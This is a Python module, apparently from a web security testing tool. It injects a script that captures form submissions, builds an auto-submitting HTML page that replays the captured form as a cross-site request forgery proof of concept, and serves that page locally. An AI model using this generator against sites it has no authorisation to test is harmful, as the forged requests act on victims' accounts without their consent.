import json
import subprocess
import time
from typing import Optional

from libs.utils.logger import FileLogger
from libs.utils import wait_for_enter


class CSRFCommands:
    def __init__(self, webdriver, jsinjector, logger: Optional[FileLogger] = None):
        self.driver = webdriver
        self.jsinjector = jsinjector
        self.logger = logger or FileLogger()
        self.server_process: Optional[subprocess.Popen] = None

    def enable_capture(self) -> None:
        """Inject JavaScript to capture form submissions."""
        capture_js = """
        window.localStorage.removeItem('__wn_last_form');
        document.addEventListener('submit', function(e){
            try {
                var f = e.target;
                var data = {};
                (new FormData(f)).forEach(function(v,k){data[k]=v;});
                window.localStorage.setItem('__wn_last_form', JSON.stringify({
                    action: f.action,
                    method: f.method || 'GET',
                    data: data
                }));
            } catch(err){}
        }, true);
        """
        self.jsinjector.execute_javascript(self.driver, capture_js)
        self.logger.log('Form capture enabled. Submit a form and then generate the CSRF PoC.')
        self.logger.log('')
        wait_for_enter()

    def _get_captured_form(self) -> Optional[dict]:
        data = self.driver.execute_script("return window.localStorage.getItem('__wn_last_form');")
        if not data:
            return None
        try:
            return json.loads(data)
        except Exception as exc:
            self.logger.error(f'Failed to parse captured form data: {exc}')
            return None

    def create_csrf_poc(self, filename: str = 'csrf_poc.html') -> bool:
        """Create an HTML file that auto-submits the captured form."""
        form = self._get_captured_form()
        if not form:
            self.logger.log('No captured form submission found.')
            self.logger.log('')
            wait_for_enter()
            return False

        html = ['<html><body>']
        action = form.get('action', '')
        method = form.get('method', 'POST')
        html.append(f"<form id='csrf' action='{action}' method='{method}'>")
        for name, value in form.get('data', {}).items():
            html.append(f"<input type='hidden' name='{name}' value='{value}' />")
        html.append('</form>')
        html.append("<script>document.getElementById('csrf').submit();</script>")
        html.append('</body></html>')
        try:
            with open(filename, 'w', encoding='utf-8') as fh:
                fh.write('\n'.join(html))
            self.logger.log(f'CSRF PoC written to {filename}')
            self.logger.log('')
            wait_for_enter()
            return True
        except Exception as exc:
            self.logger.error(f'Failed to write CSRF PoC: {exc}')
            self.logger.log('')
            wait_for_enter()
            return False

    def host_and_open(self, filename: str = 'csrf_poc.html', port: int = 8000) -> None:
        """Host the given file using python http.server and open it."""
        if self.server_process is None:
            try:
                self.server_process = subprocess.Popen(['python3', '-m', 'http.server', str(port)])
                time.sleep(1)
            except Exception as exc:
                self.logger.error(f'Failed to start HTTP server: {exc}')
                return
        try:
            self.driver.get(f'http://localhost:{port}/{filename}')
            self.logger.log('CSRF PoC opened in browser')
        except Exception as exc:
            self.logger.error(f'Error opening CSRF PoC: {exc}')
        self.logger.log('')
        wait_for_enter()

    def generate_and_open(self) -> None:
        if self.create_csrf_poc():
            self.host_and_open()
